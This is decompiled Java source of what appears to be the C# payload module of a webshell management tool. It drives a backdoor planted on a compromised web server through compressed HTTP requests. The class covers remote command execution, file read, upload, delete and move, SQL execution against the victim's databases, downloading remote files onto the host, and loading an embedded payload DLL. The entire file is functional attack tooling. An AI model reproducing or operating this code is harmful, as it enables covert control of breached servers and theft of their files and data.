//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.payloads.csharp;

import com.formdev.flatlaf.util.StringUtils;
import core.ApplicationContext;
import core.EasyI18N;
import core.OperationAuditLog;
import core.Encoding;
import core.annotation.PayloadAnnotation;
import core.c2profile.C2Profile;
import core.imp.AbstractPayload;
import core.shell.GDatabaseResult;
import core.shell.ShellEntity;
import core.ui.component.model.DbInfo;
import java.io.InputStream;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.Map;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;
import util.http.Parameter;
import util.http.ReqParameter;

@PayloadAnnotation(
    Name = "CSharpDynamicPayload"
)
public class CSharpShell extends AbstractPayload {
    private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory|CurrentWebDir) : (.+)";
    private static final LinkedHashMap<String, LinkedList<String>> ALL_DATABASE_TYPE = new LinkedHashMap();
    private ShellEntity shell;
    private RequestChannel request;
    private Encoding encoding;
    private String fileRoot;
    private String currentDir;
    private String currentUser;
    private String osInfo;
    private String basicsInfo;
    private String processArch;
    private String tempDirectory;
    private String currentWebDir;
    private boolean isAlive;
    private String sessionId;
    private int access = 0;
    private int maxErrRetry = 3;
    private C2Profile profile;

    public CSharpShell() {
    }

    public void init(ShellEntity shellContext) {
        super.init(shellContext);
        this.shell = shellContext;
        this.request = this.shell.getRequest();
        this.encoding = Encoding.getEncoding(this.shell);
        this.profile = shellContext.getCurrentProfile();
        this.maxErrRetry = this.shell.getMaxErrRetry();
    }

    public byte[] downloadFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "readFile", parameter);
        OperationAuditLog.fileOp(this.shell, "\u8bfb\u53d6/\u4e0b\u8f7d\u6587\u4ef6", fileName,
                result == null ? "null" : ("\u5b57\u8282\u6570: " + result.length));
        return result;
    }

    public String getBasicsInfo() {
        if (this.encoding == null && this.shell != null) {
            this.encoding = Encoding.getEncoding(this.shell);
        }

        if (this.basicsInfo == null) {
            ReqParameter parameter = new ReqParameter();
            byte[] result = this.evalFunc((String)null, "getBasicsInfo", parameter);
            if (result != null && result.length > 0) {
                String resultString = this.encoding != null ? this.encoding.Decoding(result) : new String(result);
                if (resultString != null && resultString.contains("Module DLL not found")) {
                    byte[] retry = this.evalFunc("payload", "getBasicsInfo", parameter);
                    if (retry != null && retry.length > 0) {
                        result = retry;
                    }
                }
            }
            if (result == null) {
                this.basicsInfo = "";
            } else if (this.encoding != null) {
                this.basicsInfo = this.encoding.Decoding(result);
            } else {
                this.basicsInfo = new String(result);
            }
        }

        Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory|CurrentWebDir) : (.+)");
        this.fileRoot = (String)pxMap.get("FileRoot");
        this.currentDir = (String)pxMap.get("CurrentDir");
        this.currentUser = (String)pxMap.get("CurrentUser");
        this.osInfo = (String)pxMap.get("OsInfo");
        this.processArch = (String)pxMap.get("ProcessArch");
        this.tempDirectory = (String)pxMap.get("TempDirectory");
        this.currentWebDir = (String)pxMap.get("CurrentWebDir");
        return this.basicsInfo;
    }

    public boolean include(String codeName, byte[] binCode) {
        ReqParameter parameters = new ReqParameter();
        parameters.add("codeName", codeName);
        parameters.add("binCode", binCode);
        byte[] result = this.evalFunc((String)null, "include", parameters);
        String resultString = this.encoding.Decoding(result).trim();
        if (resultString.equals("ok")) {
            return true;
        } else {
            Log.error(resultString);
            return false;
        }
    }

    public void fillParameter(String className, String funcName, ReqParameter parameter) {
        if (className != null && className.trim().length() > 0) {
            parameter.add("evalClassName", className);
        } 
        parameter.add("methodName", funcName);
    }

    public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
        if (this.access > 0 && !this.isAlive) {
            return ApplicationContext.NULL_BYTES;
        } else {
            this.fillParameter(className, funcName, parameter);
            if (this.sessionId != null) {
                parameter.add("sessionId", this.sessionId);
            }

            byte[] data = parameter.formatEx();
            data = functions.gzipE(data);
            byte[] result = null;
            int maxErrRetryTmp = this.retryCountFor(funcName);

            for(int i = 0; i < maxErrRetryTmp; ++i) {
                try {
                    ++this.access;
                    byte[] resp = this.request.sendRequest(data);
                    if (resp != null && resp.length != 0) {
                        result = functions.gzipD(resp);
                        if (result != null) {
                            break;
                        }
                    } else {
                        Log.error("HTTP response is empty");
                    }
                } catch (Throwable var9) {
                    var9.printStackTrace();
                }
            }

            parameter.remove("sessionId");
            return result;
        }
    }

    private int retryCountFor(String funcName) {
        if (funcName != null) {
            String name = funcName.trim();
            if ("execCommand".equalsIgnoreCase(name)) {
                return 1;
            }
        }
        return this.maxErrRetry == 0 ? 1 : (this.maxErrRetry > 0 ? this.maxErrRetry : 1);
    }

    public boolean uploadFile(String fileName, byte[] data) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        parameter.add("fileValue", data);
        byte[] result = this.evalFunc((String)null, "uploadFile", parameter);
        String stateString = this.encoding.Decoding(result);
        boolean ok = "ok".equals(stateString);
        OperationAuditLog.fileOp(this.shell, "\u4e0a\u4f20\u6587\u4ef6", fileName,
                (data == null ? 0 : data.length) + " bytes, " + (ok ? "ok" : stateString));
        if (ok) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean copyFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc((String)null, "copyFile", parameter);
        String stateString = this.encoding.Decoding(result);
        boolean ok = "ok".equals(stateString);
        OperationAuditLog.fileOp(this.shell, "\u590d\u5236\u6587\u4ef6", fileName + " -> " + newFile, ok ? "ok" : stateString);
        if (ok) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean deleteFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "deleteFile", parameter);
        String stateString = this.encoding.Decoding(result);
        boolean ok = "ok".equals(stateString);
        OperationAuditLog.fileOp(this.shell, "\u5220\u9664\u6587\u4ef6", fileName, ok ? "ok" : stateString);
        if (ok) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "newFile", parameter);
        String stateString = this.encoding.Decoding(result);
        boolean ok = "ok".equals(stateString);
        OperationAuditLog.fileOp(this.shell, "\u65b0\u5efa\u6587\u4ef6", fileName, ok ? "ok" : stateString);
        if (ok) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newDir(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dirName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "newDir", parameter);
        String stateString = this.encoding.Decoding(result);
        boolean ok = "ok".equals(stateString);
        OperationAuditLog.fileOp(this.shell, "\u65b0\u5efa\u76ee\u5f55", fileName, ok ? "ok" : stateString);
        if (ok) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public String currentDir() {
        if (this.currentDir != null) {
            return functions.formatDir(this.currentDir);
        } else {
            this.getBasicsInfo();
            return functions.formatDir(this.currentDir);
        }
    }

    public boolean test() {
        ReqParameter parameter = new ReqParameter();
        byte[] result = this.evalFunc((String)null, "test", parameter);
        Parameter resp = Parameter.deserialize(result);
        String _sessionId = resp.getParameterString("sessionId");
        if (_sessionId != null) {
            this.isAlive = true;
            this.sessionId = _sessionId;
            return true;
        } else {
            return false;
        }
    }

    public String currentUserName() {
        if (this.currentUser != null) {
            return this.currentUser;
        } else {
            this.getBasicsInfo();
            return this.currentUser;
        }
    }

    public String bigFileUpload(String fileName, long position, byte[] content) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileContents", content);
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("position", String.valueOf(position));
        byte[] result = this.evalFunc((String)null, "bigFileUpload", reqParameter);
        String ret = this.encoding.Decoding(result);
        OperationAuditLog.fileOp(this.shell, "\u5927\u6587\u4ef6\u4e0a\u4f20\u5757", fileName,
                "position=" + position + " len=" + (content == null ? 0 : content.length) + " -> " + ret);
        return ret;
    }

    public String getTempDirectory() {
        if (this.tempDirectory != null) {
            return this.tempDirectory;
        } else {
            return this.isWindows() ? "c:/windows/temp/" : "/tmp/";
        }
    }

    public byte[] bigFileDownload(String fileName, long position, int readByteNum) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("position", String.valueOf(position));
        reqParameter.add("readByteNum", String.valueOf(readByteNum));
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("mode", "read");
        byte[] chunk = this.evalFunc((String)null, "bigFileDownload", reqParameter);
        OperationAuditLog.fileOp(this.shell, "\u5927\u6587\u4ef6\u4e0b\u8f7d\u5757", fileName,
                "position=" + position + " readByteNum=" + readByteNum + " got=" + (chunk == null ? -1 : chunk.length));
        return chunk;
    }

    public long getFileSize(String fileName) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("mode", "fileSize");
        byte[] result = this.evalFunc((String)null, "bigFileDownload", reqParameter);
        String ret = this.encoding.Decoding(result);

        try {
            return Long.parseLong(ret);
        } catch (Exception var6) {
            Log.error(var6);
            Log.error(ret);
            return -1L;
        }
    }

    public boolean isWindows() {
        return StringUtils.isEmpty(this.currentDir()) ? false : this.currentDir().charAt(0) != '/';
    }

    public boolean isAlive() {
        return this.isAlive;
    }

    public boolean isX64() {
        return this.processArch != null && this.processArch.contains("64");
    }

    public String[] listFileRoot() {
        if (this.fileRoot == null) {
            this.getBasicsInfo();
        }

        if (this.fileRoot != null && this.fileRoot.length() > 0) {
            return this.fileRoot.split(";");
        }

        String dir = this.currentDir;
        if (StringUtils.isEmpty(dir)) {
            dir = this.currentDir();
        }

        dir = functions.formatDir(dir);
        if (dir.length() >= 2 && dir.charAt(1) == ':') {
            return new String[]{dir.substring(0, 2) + "/"};
        } else if (dir.startsWith("/")) {
            return new String[]{"/"};
        } else {
            return new String[]{"c:/"};
        }
    }

    public String execCommand(String commandStr) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmdLine", this.encoding.Encoding(commandStr));
        String[] commandArgs = functions.SplitArgs(commandStr);

        for(int i = 0; i < commandArgs.length; ++i) {
            parameter.add(String.format("arg-%d", i), this.encoding.Encoding(commandArgs[i]));
        }

        parameter.add("argsCount", String.valueOf(commandArgs.length));
        String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
        if (executableArgs.length > 0) {
            parameter.add("executableFile", executableArgs[0]);
            if (executableArgs.length >= 2) {
                parameter.add("executableArgs", executableArgs[1]);
            }
        }

        byte[] result = this.evalFunc((String)null, "execCommand", parameter);
        String decoded = this.encoding.Decoding(result);
        OperationAuditLog.exec(this.shell, commandStr, decoded);
        return decoded;
    }

    public String getOsInfo() {
        if (this.osInfo != null) {
            return this.osInfo;
        } else {
            this.getBasicsInfo();
            return this.osInfo;
        }
    }

    public String[] getSupportDatabaseTypes() {
        return (String[])((String[])ALL_DATABASE_TYPE.keySet().toArray(new String[0]));
    }

    public String[] getDatabaseDrives(String databaseName) {
        return (String[])((String[])((LinkedList)ALL_DATABASE_TYPE.get(databaseName)).toArray(new String[0]));
    }

    public String getDatabaseConnectString(DbInfo dbInfo) {
        String connectString = "";
        String currentDatabase = dbInfo.getCurrentDatabase().trim();
        switch (dbInfo.getDatabaseType().toLowerCase()) {
            case "mysql":
                connectString = "server={databaseHost};port={databasePort};uid={databaseUserName};pwd={databasePassWord};database={currentDatabase};";
                break;
            case "oracle":
                String serviceType = dbInfo.isOracleIsSid() ? "SID" : "SERVICE_NAME";
                connectString = "User ID={databaseUserName};Password={databasePassWord};Data Source=(DESCRIPTION = (ADDRESS_LIST= (ADDRESS = (PROTOCOL = TCP)(HOST = {databaseHost})(PORT = {databasePort}))) (CONNECT_DATA = ({SERVICE_TYPE} = {SERVICE_NAME_STR})));";
                connectString = connectString.replace("{SERVICE_TYPE}", serviceType);
                connectString = connectString.replace("{SERVICE_NAME_STR}", dbInfo.getOracleServiceName());
                if (dbInfo.getUsername().equals("sys")) {
                    connectString = connectString + "DBA Privilege=SYSDBA;";
                }
                break;
            case "sqlserver":
                connectString = "server={databaseHost};uid={databaseUserName};pwd={databasePassWord};database={currentDatabase};Pooling=true; MAX Pool Size=512;Min Pool Size=50;Connection Lifetime=30";
                break;
            case "postgresql":
                connectString = "Host={databaseHost};Port={databasePort};Username={databaseUserName};Password={databasePassWord};Database={currentDatabase};";
                break;
            default:
                connectString = "Host={databaseHost};Port={databasePort};Username={databaseUserName};Password={databasePassWord};Database={currentDatabase};";
        }

        connectString = connectString.replace("{databaseHost}", dbInfo.getHost()).replace("{databasePort}", String.valueOf(dbInfo.getPort())).replace("{databaseCharset}", dbInfo.getDatabaseCharset2().getCharsetString()).replace("{currentDatabase}", currentDatabase).replace("{databaseUserName}", dbInfo.getUsername()).replace("{databasePassWord}", dbInfo.getPassword());
        return connectString;
    }

    public GDatabaseResult execSql(DbInfo dbInfo, String execType, String execSql) {
        if (dbInfo.getDatabaseCharset() == null || dbInfo.getDatabaseCharset().trim().isEmpty()) {
            dbInfo.setDatabaseCharset("UTF-8");
        }
        Encoding dbEncoding = dbInfo.getDatabaseCharset2();
        String connectString = dbInfo.getConnectionString();
        if (connectString.isEmpty()) {
            connectString = this.getDatabaseConnectString(dbInfo);
        }

        ReqParameter parameter = new ReqParameter();
        parameter.add("dbType", dbInfo.getDatabaseType());
        parameter.add("dbUsername", dbInfo.getUsername());
        parameter.add("dbPassword", dbInfo.getPassword());
        String charset = dbEncoding.getCharsetString();
        if (charset == null || charset.trim().isEmpty()) {
            charset = "UTF-8";
        }
        parameter.add("dbCharset", charset);
        parameter.add("connectString", dbEncoding.Encoding(connectString));
        String drive = dbInfo.getDatabaseDrive();
        if (drive == null || drive.trim().isEmpty()) {
            String[] drives = this.getDatabaseDrives(dbInfo.getDatabaseType());
            if (drives != null && drives.length > 0) {
                drive = drives[0];
            }
        }
        parameter.add("dbDriver", drive == null ? "" : drive);
        parameter.add("execType", execType);
        parameter.add("execSql", dbEncoding.Encoding(execSql));
        String sqlPreview = execSql == null ? "" : (execSql.length() > 1200 ? execSql.substring(0, 1200) + "\n..." : execSql);
        OperationAuditLog.fileOp(this.shell, "\u6570\u636e\u5e93 SQL", execType + " / " + dbInfo.getDatabaseType(), sqlPreview);
        byte[] result = this.evalFunc((String)null, "execSql", parameter);
        if (result == null) {
            throw new IllegalArgumentException(EasyI18N.getI18nString("返回数据是空的"));
        } else {
            Parameter resp = Parameter.deserialize(result);
            if (resp == null) {
                String message = dbInfo.getDatabaseCharset2().Decoding(result);
                Log.error(message);
                throw new IllegalArgumentException(functions.substring(message, 0, 300));
            } else {
                return new GDatabaseResult(resp, dbEncoding);
            }
        }
    }

    public boolean moveFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc((String)null, "moveFile", parameter);
        String stasteString = this.encoding.Decoding(result);
        boolean ok = "ok".equals(stasteString);
        OperationAuditLog.fileOp(this.shell, "\u79fb\u52a8/\u91cd\u547d\u540d\u6587\u4ef6", fileName + " -> " + newFile, ok ? "ok" : stasteString);
        if (ok) {
            return true;
        } else {
            Log.error(stasteString);
            return false;
        }
    }

    public byte[] getPayload() {
        byte[] data = null;

        try {
            InputStream fileInputStream = CSharpShell.class.getResourceAsStream("assets/payload.dll");
            data = functions.readInputStream(fileInputStream);
            fileInputStream.close();
        } catch (Exception var3) {
            Log.error(var3);
        }

        return data;
    }

    public boolean fileRemoteDown(String url, String saveFile) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("url", this.encoding.Encoding(url));
        reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
        String result = this.encoding.Decoding(this.evalFunc((String)null, "fileRemoteDown", reqParameter));
        boolean ok = "ok".equals(result);
        OperationAuditLog.fileOp(this.shell, "\u8fdc\u7a0b\u4e0b\u8f7d", url + " -> " + saveFile, ok ? "ok" : result);
        if (ok) {
            return true;
        } else {
            Log.error(result);
            return false;
        }
    }

    public boolean setFileAttr(String file, String type, String fileAttr) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("type", type);
        reqParameter.add("fileName", this.encoding.Encoding(file));
        reqParameter.add("attr", fileAttr);
        String result = this.encoding.Decoding(this.evalFunc((String)null, "setFileAttr", reqParameter));
        boolean ok = "ok".equals(result);
        OperationAuditLog.fileOp(this.shell, "\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027", file, "type=" + type + " " + (ok ? "ok" : result));
        if (ok) {
            return true;
        } else {
            Log.error(result);
            return false;
        }
    }

    public synchronized boolean close() {
        String result = null;

        try {
            ReqParameter reqParameter = new ReqParameter();
            result = this.encoding.Decoding(this.evalFunc((String)null, "close", reqParameter));
        } catch (Exception var6) {
        } finally {
            this.isAlive = false;
        }

        OperationAuditLog.fileOp(this.shell, "\u5173\u95ed\u4f1a\u8bdd", "close", "ok".equals(result) ? "ok" : String.valueOf(result));
        if ("ok".equals(result)) {
            return true;
        } else {
            Log.error(result);
            return false;
        }
    }

    public String getWebDir() {
        return !StringUtils.isEmpty(this.currentWebDir) ? this.currentWebDir : this.currentDir();
    }

    static {
        LinkedList<String> mysqlDrives = new LinkedList();
        LinkedList<String> oracleDrives = new LinkedList();
        LinkedList<String> sqlserverDrives = new LinkedList();
        LinkedList<String> postgresqlDrives = new LinkedList();
        LinkedList<String> sqliteDrives = new LinkedList();
        LinkedList<String> customDrives = new LinkedList();
        ALL_DATABASE_TYPE.put("mysql", mysqlDrives);
        ALL_DATABASE_TYPE.put("oracle", oracleDrives);
        ALL_DATABASE_TYPE.put("sqlserver", sqlserverDrives);
        ALL_DATABASE_TYPE.put("postgresql", postgresqlDrives);
        ALL_DATABASE_TYPE.put("sqlite", sqliteDrives);
        ALL_DATABASE_TYPE.put("custom", customDrives);
        mysqlDrives.add("MySql.Data.MySqlClient.MySqlConnection");
        oracleDrives.add("Oracle.ManagedDataAccess.Client.OracleConnection");
        sqlserverDrives.add("System.Data.SqlClient.SqlConnection");
        postgresqlDrives.add("Npgsql.NpgsqlConnection");
        sqliteDrives.add("org.sqlite.JDBC");
        customDrives.add("my.sql.Driver");
    }
}
